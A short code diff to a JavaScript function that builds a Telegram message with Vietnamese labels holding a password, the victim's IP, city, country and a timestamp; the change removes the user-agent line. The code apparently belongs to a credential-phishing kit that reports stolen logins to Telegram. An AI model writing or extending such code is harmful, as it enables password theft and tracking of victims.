@@ -54,7 +54,6 @@ const createTelegramMessage = (
     : "🔑 <b>Mật Khẩu  :</b>";
 
   return `
-👤 <b>User Agent:</b> <code>${navigator.userAgent}</code>
 🌐 <b>IP:</b> <code>${geoData.ip}</code>
 🏳️ <b>Vị Trí:</b> <code>${geoData.city} - ${geoData.country}</code>
 ⏰ <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
